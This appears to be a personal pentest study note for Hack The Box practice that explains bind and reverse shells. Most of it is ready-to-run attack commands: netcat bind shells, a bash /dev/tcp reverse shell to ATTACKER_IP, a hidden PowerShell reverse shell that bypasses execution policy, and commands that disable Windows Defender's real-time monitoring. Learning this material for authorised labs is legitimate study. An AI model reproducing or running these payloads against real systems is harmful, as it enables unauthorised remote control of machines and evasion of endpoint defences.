
---

# 🐚 Shells (Bind vs Reverse)

---

> [!info] 🧠 Core Idea  
> A **shell** allows you to control a remote machine from your attacker system.

---

## 🔗 Bind Shell

> [!note] 📌 Definition  
> The **target opens a port**, and the attacker connects to it.

---

> [!example] ⚙️ Flow
> 
> ```
> Attacker ─────► Target (listening)
> ```

---

> [!code] 💻 Example  
> **Target (victim):**
> 
> ```bash
> nc -lvnp 7777
> ```
> 
> **Attacker:**
> 
> ```bash
> nc -nv TARGET_IP 7777
> ```

---

> [!warning] ⚠️ Problems
> 
> - Requires open inbound port
>     
> - Blocked by firewall/NAT
>     
> - Needs internal network access
>     
> 
> “OS firewalls will likely block most incoming connections”

---

## 🔄 Reverse Shell (🔥 Preferred)

> [!success] 📌 Definition  
> The **target connects back to the attacker**.

---

> [!example] ⚙️ Flow
> 
> ```
> Target ─────► Attacker (listening)
> ```

---

> [!code] 💻 Example  
> **Attacker:**
> 
> ```bash
> nc -lvnp 4242
> ```
> 
> **Target:**
> 
> ```bash
> bash -i >& /dev/tcp/ATTACKER_IP/4242 0>&1
> ```

---

> [!success] ✅ Advantages
> 
> - Bypasses firewall (outbound allowed)
>     
> - Works behind NAT
>     
> - Most reliable in real pentests
>     

---

## 🧪 Netcat Bind Shell (Real Shell)

> [!code] 🛠️ Payload
> 
> ```bash
> rm -f /tmp/f; mkfifo /tmp/f
> cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 7777 > /tmp/f
> ```

---

## ⚠️ Common Issues (HTB)

> [!danger] ❌ Connection Failed
> 
> - VPN not connected
>     
> - Target not spawned
>     
> - Wrong IP
>     

---

> [!danger] ❌ No Shell
> 
> - Listener not running
>     
> - Wrong IP/Port
>     
> - Firewall blocking
>     

---

## 🛠️ Debug Checklist

> [!check] 🔍 Always Verify
> 
> ```bash
> # VPN IP
> ip a | grep tun0
> 
> # Port check
> nmap -Pn -p PORT TARGET_IP
> 
> # Listener
> nc -lvnp PORT
> ```

---

## 🪟 Windows Reverse Shell

> [!tip] 💡 Reliable Option (PowerShell)
> 
> ```powershell
> powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
> ```

---

## 🎯 Final Takeaway

> [!summary] 🚀
> 
> - **Bind shell = simple but easily blocked**
>     
> - **Reverse shell = real-world standard**
>     

---





> [!example] Payload of things
> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources

> [!tip]
> # Disable Defender

```
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

```